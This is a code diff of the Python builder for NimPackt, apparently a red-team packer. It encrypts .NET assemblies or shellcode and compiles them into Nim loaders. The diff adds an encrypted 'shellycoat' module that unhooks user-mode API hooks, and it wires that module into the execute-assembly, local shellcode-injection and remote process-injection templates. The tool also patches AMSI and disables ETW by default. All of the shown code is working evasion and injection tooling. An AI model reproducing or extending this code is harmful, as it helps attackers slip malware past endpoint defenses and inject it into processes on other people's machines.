@@ -58,20 +58,19 @@ from Crypto.Util import Counter
 #         #    outFile.write(result)
 #         #    print(f"Wrote Nim bytestring to '{outFilename}'.")
 
-#         result = f"let b64buf : noCryptString = \"{str(base64.b64encode(blob_data), 'utf-8')}\""
+#         result = f"let b64buf = \"{str(base64.b64encode(blob_data), 'utf-8')}\""
 
 #     return result
 
 def int_of_string(s):
     return int(binascii.hexlify(s), 16)
 
-def encrypt_message(key, plaintext):
-    iv = os.urandom(16)
+def encrypt_message(key, iv, plaintext):
     ctr = Counter.new(128, initial_value=int_of_string(iv))
     aes = AES.new(key, AES.MODE_CTR, counter=ctr)
-    return iv + aes.encrypt(plaintext) # TODO: Fix *nix 'TypeError: argument must be read-only bytes-like object, not bytearray'
+    return iv + aes.encrypt(plaintext)
 
-def aesEncryptInputFile(inFilename):
+def cryptFiles(inFilename, unhookApis, x64):
     if not os.path.exists(inFilename):
         raise SystemExit("ERROR: Input file is not valid.")
 
@@ -79,14 +78,15 @@ def aesEncryptInputFile(inFilename):
     with open(inFilename,'rb') as inFile:
         plaintext = inFile.read()
         key =  os.urandom(16) # AES-128, so 16 bytes
-        ciphertext = encrypt_message(key, plaintext)
+        iv = os.urandom(16)
+        ciphertext = encrypt_message(key, iv, plaintext)
 
-        # Input is base64-encoded to reduce size and prevent OOM errors when compiling Nim
-        cryptedInput = f"let b64buf : noCryptString = \"{str(base64.b64encode(ciphertext[16:]), 'utf-8')}\""
+        # Pass the encrypted string, skipping the IV portion
+        cryptedInput = f"let b64buf = \"{str(base64.b64encode(ciphertext[16:]), 'utf-8')}\""
 
         # Define as bytearray to inject in Nim source code
-        cryptIV = f"let cryptIV: array[{len(ciphertext[:16])}, byte] = [byte "
-        cryptIV = cryptIV + ",".join ([f"{x:#0{4}x}" for x in ciphertext[:16]])
+        cryptIV = f"let cryptIV: array[{len(iv)}, byte] = [byte "
+        cryptIV = cryptIV + ",".join ([f"{x:#0{4}x}" for x in iv])
         cryptIV = cryptIV + "]"
 
         # cryptKey is defined as a const to place it at a different spot in the binary
@@ -94,7 +94,18 @@ def aesEncryptInputFile(inFilename):
         cryptKey = cryptKey + ",".join ([f"{x:#0{4}x}" for x in key])
         cryptKey = cryptKey + "]"
 
-    return cryptedInput, cryptIV, cryptKey
+    if unhookApis:
+        if x64:
+            with open('dist/shellycoat_x64.bin','rb') as coatFile:
+                plaintext = coatFile.read()
+                cipherCoat = encrypt_message(key, iv, plaintext)
+                cryptedCoat = f"let cryptedCoat = \"{str(base64.b64encode(cipherCoat[16:]), 'utf-8')}\""
+        else:
+            raise SystemExit("ERROR: Bypassing user-mode API hooks is not supported in 32-bit mode.")
+    else:
+        cryptedCoat = "let cryptedCoat = \"\"" # This implies disabling UM API unhooking
+
+    return cryptedInput, cryptedCoat, cryptIV, cryptKey
 
 def parseArguments(inArgs):
     # Construct the packed arguments in the right format (array split on space)
@@ -109,7 +120,7 @@ def parseArguments(inArgs):
 
     return result
         
-def generateSource_ExecuteAssembly(fileName, cryptedInput, cryptIV, cryptKey, argString, disableAmsi, disableEtw, verbose):
+def generateSource_ExecuteAssembly(fileName, cryptedInput, cryptedCoat, cryptIV, cryptKey, argString, disableAmsi, disableEtw, verbose):
     # Construct the Nim source file based on the passed arguments, using the Execute-Assembly template 
     filenames = ["NimPackt-Template-Base.nim", "NimPackt-Template-ExecuteAssembly.nim"]
     result = ""
@@ -122,6 +133,7 @@ def generateSource_ExecuteAssembly(fileName, cryptedInput, cryptIV, cryptKey, ar
                 new_line = new_line.replace('#[ PLACEHOLDERPATCHAMSI ]#', f"let optionPatchAmsi = {str(disableAmsi).lower()}")
                 new_line = new_line.replace('#[ PLACEHOLDERDISABLEETW ]#', f"let optionDisableEtw = {str(disableEtw).lower()}")
                 new_line = new_line.replace('#[ PLACEHOLDERCRYPTEDINPUT ]#', cryptedInput)
+                new_line = new_line.replace('#[ PLACEHOLDERCRYPTEDSHELLYCOAT ]#', cryptedCoat)
                 new_line = new_line.replace('#[ PLACEHOLDERCRYPTIV ]#', cryptIV)
                 new_line = new_line.replace('#[ PLACEHOLDERARGUMENTS ]#', argString)
                 result += new_line +"\n"
@@ -138,7 +150,7 @@ def generateSource_ExecuteAssembly(fileName, cryptedInput, cryptIV, cryptKey, ar
 
     return outFilename
 
-def generateSource_Shinject(fileName, cryptedInput, cryptIV, cryptKey, disableAmsi, disableEtw, verbose):
+def generateSource_Shinject(fileName, cryptedInput, cryptedCoat, cryptIV, cryptKey, disableAmsi, disableEtw, verbose):
     # Construct the Nim source file based on the passed arguments, using the Execute-Assembly template 
     filenames = ["NimPackt-Template-Base.nim", "NimPackt-Template-Shinject.nim"]
     result = ""
@@ -151,6 +163,7 @@ def generateSource_Shinject(fileName, cryptedInput, cryptIV, cryptKey, disableAm
                 new_line = new_line.replace('#[ PLACEHOLDERPATCHAMSI ]#', f"let optionPatchAmsi = {str(disableAmsi).lower()}")
                 new_line = new_line.replace('#[ PLACEHOLDERDISABLEETW ]#', f"let optionDisableEtw = {str(disableEtw).lower()}")
                 new_line = new_line.replace('#[ PLACEHOLDERCRYPTEDINPUT ]#', cryptedInput)
+                new_line = new_line.replace('#[ PLACEHOLDERCRYPTEDSHELLYCOAT ]#', cryptedCoat)
                 new_line = new_line.replace('#[ PLACEHOLDERCRYPTIV ]#', cryptIV)
                 result += new_line +"\n"
 
@@ -166,7 +179,7 @@ def generateSource_Shinject(fileName, cryptedInput, cryptIV, cryptKey, disableAm
 
     return outFilename
 
-def generateSource_RemoteShinject(fileName, cryptedInput, cryptIV, cryptKey, disableAmsi, disableEtw, verbose, injecttarget, existingprocess):
+def generateSource_RemoteShinject(fileName, cryptedInput, cryptedCoat, cryptIV, cryptKey, disableAmsi, disableEtw, verbose, injecttarget, existingprocess):
     # Construct the Nim source file based on the passed arguments, using the Execute-Assembly template 
     filenames = ["NimPackt-Template-Base.nim", "NimPackt-Template-RemoteShinject.nim"]
     result = ""
@@ -179,8 +192,9 @@ def generateSource_RemoteShinject(fileName, cryptedInput, cryptIV, cryptKey, dis
                 new_line = new_line.replace('#[ PLACEHOLDERPATCHAMSI ]#', f"let optionPatchAmsi = {str(disableAmsi).lower()}")
                 new_line = new_line.replace('#[ PLACEHOLDERDISABLEETW ]#', f"let optionDisableEtw = {str(disableEtw).lower()}")
                 new_line = new_line.replace('#[ PLACEHOLDERCRYPTEDINPUT ]#', cryptedInput)
+                new_line = new_line.replace('#[ PLACEHOLDERCRYPTEDSHELLYCOAT ]#', cryptedCoat)
                 new_line = new_line.replace('#[ PLACEHOLDERCRYPTIV ]#', cryptIV)
-                new_line = new_line.replace('#[ PLACEHOLDERINJECTCALL ]#', f"injectShellcodeRemote(decoded, \"{injecttarget}\", {str(existingprocess).lower()})")
+                new_line = new_line.replace('#[ PLACEHOLDERINJECTCALL ]#', f"injectShellcodeRemote(decodedPay, \"{injecttarget}\", {str(existingprocess).lower()})")
                 result += new_line +"\n"
 
     outDir = "./output/"
@@ -219,10 +233,10 @@ def compileNim(fileName, hideApp, x64):
             os.system(f"nim c -d=mingw -d:danger -d:strip -d:release --hints:off --opt:size --passc=-flto --passl=-flto --maxLoopIterationsVM:100000000 --app:{gui} --cpu={cpu} {fileName}")
     except:
         e = sys.exc_info()[0]
-        print(f"There was an error compiling the binary: {e}")
+        raise SystemExit(f"There was an error compiling the binary: {e}")
 
     os.remove(fileName)
-    print("Successfully compiled Nim binary! Go forth and make a Nimpackt that matters 😎")
+    print("Successfully compiled Nim binary! Go forth and make a Nimpackt that matters \N{smiling face with sunglasses}")
     
 
 if __name__ == "__main__":
@@ -241,6 +255,7 @@ if __name__ == "__main__":
     injection.add_argument('-E', '--existing', action='store_true', dest='existingprocess', default=False, help='Remote inject into existing process rather than a newly spawned one (default false, implies -r) (WARNING: VOLATILE)')
     optional.add_argument('-32', '--32bit', action='store_false', default=True, dest='x64', help='Compile in 32-bit mode')
     optional.add_argument('-H', '--hideapp', action='store_true', default=False, dest='hideApp', help='Hide the app frontend (console output) by compiling it in GUI mode')
+    optional.add_argument('-nu', '--nounhook', action='store_false', default=True, dest='unhookApis', help='Do NOT unhook user-mode API hooks')
     optional.add_argument('-na', '--nopatchamsi', action='store_false', default=True, dest='patchAmsi', help='Do NOT patch (disable) the Anti-Malware Scan Interface (AMSI)')
     optional.add_argument('-ne', '--nodisableetw', action='store_false', default=True, dest='disableEtw', help='Do NOT disable Event Tracing for Windows (ETW)')
     optional.add_argument('-v', '--verbose', action='store_true', default=False, dest='verbose', help='Print debug messages of the wrapped binary at runtime')
@@ -263,18 +278,18 @@ if __name__ == "__main__":
     if args.executionmode == "shinject" and (args.injecttarget != "explorer.exe" or args.existingprocess == True):
         args.localinject = False
 
-    cryptedInput, cryptIV, cryptKey = aesEncryptInputFile(args.inputfile)
+    cryptedInput, cryptedCoat, cryptIV, cryptKey = cryptFiles(args.inputfile, args.unhookApis, args.x64)
 
     argString = parseArguments(args.arguments)
 
     if args.executionmode == "execute-assembly":
-        sourceFile = generateSource_ExecuteAssembly(args.inputfile, cryptedInput, cryptIV, cryptKey,
+        sourceFile = generateSource_ExecuteAssembly(args.inputfile, cryptedInput, cryptedCoat, cryptIV, cryptKey,
             argString, args.patchAmsi, args.disableEtw, args.verbose)
     elif args.executionmode == "shinject" and args.localinject == True:
-        sourceFile = generateSource_Shinject(args.inputfile, cryptedInput, cryptIV, cryptKey,
+        sourceFile = generateSource_Shinject(args.inputfile, cryptedInput, cryptedCoat, cryptIV, cryptKey,
             args.patchAmsi, args.disableEtw, args.verbose)
     elif args.executionmode == "shinject" and args.localinject == False:
-        sourceFile = generateSource_RemoteShinject(args.inputfile, cryptedInput, cryptIV, cryptKey,
+        sourceFile = generateSource_RemoteShinject(args.inputfile, cryptedInput, cryptedCoat, cryptIV, cryptKey,
             args.patchAmsi, args.disableEtw, args.verbose, args.injecttarget, args.existingprocess)
     else:
         raise SystemExit("ERROR: Argument 'executionmode' is not valid. Please specify either of 'execute-assembly', 'shinject', or 'shinject-remote'.")
